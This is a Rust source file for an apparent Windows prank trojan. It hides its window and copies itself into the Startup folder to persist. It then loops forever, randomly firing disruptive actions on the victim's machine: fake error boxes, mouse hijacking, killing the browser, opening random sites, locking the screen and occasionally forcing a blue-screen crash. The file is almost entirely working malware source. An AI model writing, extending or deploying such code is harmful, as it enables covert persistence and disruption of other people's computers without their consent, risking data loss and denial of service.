#![windows_subsystem = "windows"]

extern crate alloc;

mod windows;
mod trollages;

use std::sync::mpsc::channel;
use std::time::Duration;
use std::fs::File;
use std::io::copy;
use std::thread;
use rand::Rng;
use std::env;

fn main() {
    //TODO: Use elevated perms if elevated, currently it just starts itself as admin in C:\Programs
    persistence(windows::is_app_elevated());
    trolling_loop()
}

fn trolling_loop() {
    loop {
        // sleep between 50 seconds and 8 minutes
        let random_number = rand::thread_rng().gen_range(50000..=480000);
        thread::sleep(Duration::from_millis(random_number));

        let (sender, receiver) = channel();
        let handle = thread::spawn(move || {
            // 0.03125% chance of bsoding or one bsod every 2:21:20h
            if rand::thread_rng().gen_range(1..33) == 1 {
                bsod::bsod()
            }
            rand_troll();
            // sends response if troll happened
            sender.send(()).unwrap();
        });
        // receives the response, if no response from thread then kill it
        let _ = receiver.recv_timeout(Duration::from_secs(60)).unwrap_or(handle.thread().unpark());
    }
}

fn rand_troll() {
    let rand_num = rand::thread_rng().gen_range(0..9);
    match rand_num {
        0 => trollages::weird_msgbox(),
        1 => trollages::error_msgbox(),
        2 => trollages::jiggly_mouse(),
        3 => trollages::stuck_mouse(),
        4 => trollages::kill_browser(),
        5 => trollages::rand_site(),
        6 => trollages::rand_lmgtfy(),
        7 => trollages::rand_speak(),
        8 => trollages::bloat_start(),
        9 =>trollages::lock(),
        _ => panic!("Unexpected random number generated")
    }
}

fn persistence(elevated: bool) {
    let current_buf = env::current_exe().unwrap();
    let exe_basename = current_buf.parent().unwrap().to_str().unwrap();
    let exe_name = current_buf.file_name().unwrap().to_str().unwrap();
    let mut startup_user = env::var("APPDATA").unwrap();
    if elevated {
        startup_user = "C:\\ProgramData".to_string();
    }

    let execution_path = exe_basename.to_owned() + "\\" + exe_name;
    let startup_path = startup_user + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\" + exe_name;

    let mut src = File::open(&execution_path).unwrap();
    let mut dest = File::create(&startup_path).unwrap();

    if execution_path != startup_path {
        let _ = copy(&mut src,&mut dest).unwrap();
    }
}